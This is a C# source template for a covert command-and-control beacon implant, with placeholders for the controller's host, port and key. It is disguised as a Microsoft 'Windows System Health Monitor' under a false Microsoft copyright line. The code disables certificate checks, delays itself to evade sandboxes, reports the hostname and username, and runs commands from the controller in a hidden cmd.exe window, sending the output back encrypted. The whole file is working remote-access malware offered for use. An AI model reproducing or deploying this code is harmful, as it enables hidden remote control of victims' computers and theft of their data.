// Windows System Health Monitor — Endpoint diagnostic service
// Copyright (c) Microsoft Corporation. All rights reserved.
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;

namespace SvcHealth
{
    class Program
    {
        // Build-time configuration — replaced by generator
        static string C2Host = "{{C2_HOST}}";
        static string C2Port = "{{C2_PORT}}";
        static string C2Scheme = "{{C2_SCHEME}}";
        static string EncKey = "{{ENCRYPTION_KEY}}";
        static int BeaconSleep = {{BEACON_INTERVAL}};
        static int BeaconJitter = {{BEACON_JITTER}};
        static string RegisterUri = "{{REGISTER_URI}}";
        static string CheckinUri = "{{CHECKIN_URI}}";
        static string ResultUri = "{{RESULT_URI}}";
        static string UserAgent = "{{USER_AGENT}}";

        static string AgentId = "";
        static readonly HttpClient Client = new HttpClient(new HttpClientHandler
        {
            ServerCertificateCustomValidationCallback = (_, _, _, _) => true
        })
        { Timeout = TimeSpan.FromSeconds(60) };

        static byte[] DeriveKey(string key)
        {
            using var sha = SHA256.Create();
            return sha.ComputeHash(Encoding.UTF8.GetBytes(key));
        }

        static string Encrypt(string plaintext)
        {
            try
            {
                var key = DeriveKey(EncKey);
                var nonce = new byte[12];
                RandomNumberGenerator.Fill(nonce);
                using var aes = new AesGcm(key, 16);
                var pt = Encoding.UTF8.GetBytes(plaintext);
                var ct = new byte[pt.Length];
                var tag = new byte[16];
                aes.Encrypt(nonce, pt, ct, tag);
                var result = new byte[4 + 12 + ct.Length + 16];
                Encoding.ASCII.GetBytes("AES1").CopyTo(result, 0);
                nonce.CopyTo(result, 4);
                ct.CopyTo(result, 16);
                tag.CopyTo(result, 16 + ct.Length);
                return Convert.ToBase64String(result);
            }
            catch
            {
                // XOR fallback
                var key = Encoding.UTF8.GetBytes(EncKey);
                var data = Encoding.GetEncoding("iso-8859-1").GetBytes(plaintext);
                for (int i = 0; i < data.Length; i++) data[i] ^= key[i % key.Length];
                return Convert.ToBase64String(data);
            }
        }

        static string Decrypt(string encoded)
        {
            var raw = Convert.FromBase64String(encoded);
            if (raw.Length > 4 && Encoding.ASCII.GetString(raw, 0, 4) == "AES1")
            {
                try
                {
                    var key = DeriveKey(EncKey);
                    var nonce = raw[4..16];
                    var ct = raw[16..^16];
                    var tag = raw[^16..];
                    using var aes = new AesGcm(key, 16);
                    var pt = new byte[ct.Length];
                    aes.Decrypt(nonce, ct, tag, pt);
                    return Encoding.UTF8.GetString(pt);
                }
                catch { }
            }
            // XOR fallback
            var k = Encoding.UTF8.GetBytes(EncKey);
            var dec = new byte[raw.Length];
            for (int i = 0; i < raw.Length; i++) dec[i] = (byte)(raw[i] ^ k[i % k.Length]);
            return Encoding.GetEncoding("iso-8859-1").GetString(dec);
        }

        static string HttpPost(string path, string body)
        {
            try
            {
                var url = $"{C2Scheme}://{C2Host}:{C2Port}{path}";
                var request = new HttpRequestMessage(HttpMethod.Post, url)
                {
                    Content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded")
                };
                request.Headers.TryAddWithoutValidation("User-Agent", UserAgent);
                request.Headers.TryAddWithoutValidation("Accept", "text/html,*/*");
                var response = Client.Send(request);
                using var reader = new StreamReader(response.Content.ReadAsStream());
                return reader.ReadToEnd();
            }
            catch { return ""; }
        }

        static string ExecuteCommand(string cmd)
        {
            if (cmd.StartsWith("cd "))
            {
                try
                {
                    Directory.SetCurrentDirectory(cmd[3..].Trim());
                    return $"Changed directory to {Directory.GetCurrentDirectory()}";
                }
                catch (Exception e) { return $"Error: {e.Message}"; }
            }

            try
            {
                var psi = new ProcessStartInfo("cmd.exe", $"/C {cmd}")
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using var proc = Process.Start(psi);
                var output = proc!.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                proc.WaitForExit(30000);
                return string.IsNullOrEmpty(output) ? "Command executed (no output)" : output;
            }
            catch (Exception e) { return $"Error: {e.Message}"; }
        }

        static bool Register()
        {
            var hostname = Environment.MachineName;
            var username = Environment.UserName;
            var msg = $"{{\"type\":\"register\",\"metadata\":{{\"hostname\":\"{hostname}\",\"username\":\"{username}\",\"os\":\"Windows\",\"mode\":\"beacon\",\"beacon_interval\":{BeaconSleep}}}}}";
            var enc = Encrypt(msg);
            var resp = HttpPost(RegisterUri, enc);
            if (string.IsNullOrEmpty(resp)) return false;
            var dec = Decrypt(resp);
            if (dec.Contains("\"registered\"") || dec.Contains("\"checkin_ack\""))
            {
                var idx = dec.IndexOf("\"agent_id\":\"");
                if (idx >= 0)
                {
                    var start = idx + 12;
                    var end = dec.IndexOf('"', start);
                    AgentId = dec[start..end];
                    return true;
                }
            }
            return false;
        }

        static List<string> Checkin(List<string> results)
        {
            var resultsJson = results.Count == 0 ? "[]" : $"[{string.Join(",", results)}]";
            var msg = $"{{\"type\":\"checkin\",\"agent_id\":\"{AgentId}\",\"metadata\":{{\"mode\":\"beacon\"}},\"results\":{resultsJson}}}";
            var enc = Encrypt(msg);
            var resp = HttpPost(CheckinUri, enc);
            var commands = new List<string>();
            if (string.IsNullOrEmpty(resp)) return commands;
            var dec = Decrypt(resp);
            if (dec.Contains("\"commands\""))
            {
                var search = "\"command\":\"";
                var pos = 0;
                while ((pos = dec.IndexOf(search, pos)) >= 0)
                {
                    var start = pos + search.Length;
                    var end = dec.IndexOf('"', start);
                    if (end > start) commands.Add(dec[start..end]);
                    pos = end + 1;
                }
            }
            return commands;
        }

        static void SleepWithJitter()
        {
            var rng = new Random();
            if (BeaconJitter > 0 && BeaconJitter <= 100)
            {
                var jitterRange = BeaconSleep * BeaconJitter / 100.0;
                var sleepMs = (int)((BeaconSleep + (rng.NextDouble() * 2 - 1) * jitterRange) * 1000);
                Thread.Sleep(Math.Max(1000, sleepMs));
            }
            else
            {
                Thread.Sleep(BeaconSleep * 1000);
            }
        }

        static void Main(string[] args)
        {
            // Sandbox check
            if (Environment.ProcessorCount < 2) Thread.Sleep(30000);

            // Register
            for (int i = 0; i < 10 && string.IsNullOrEmpty(AgentId); i++)
            {
                Register();
                if (string.IsNullOrEmpty(AgentId)) Thread.Sleep(5000);
            }
            if (string.IsNullOrEmpty(AgentId)) return;

            // Beacon loop
            var pending = new List<string>();
            while (true)
            {
                var commands = Checkin(pending);
                pending.Clear();

                foreach (var cmd in commands)
                {
                    if (cmd == "__kill") Environment.Exit(0);
                    if (cmd.StartsWith("__set_interval:"))
                    {
                        if (int.TryParse(cmd.Split(':')[1], out var newInterval))
                            BeaconSleep = newInterval;
                        continue;
                    }

                    var output = ExecuteCommand(cmd);
                    var escaped = output.Replace("\\", "\\\\").Replace("\"", "\\\"")
                        .Replace("\n", "\\n").Replace("\r", "\\r");
                    pending.Add($"{{\"type\":\"response\",\"output\":\"{escaped}\",\"command\":\"{cmd}\"}}");
                }

                SleepWithJitter();
            }
        }
    }
}
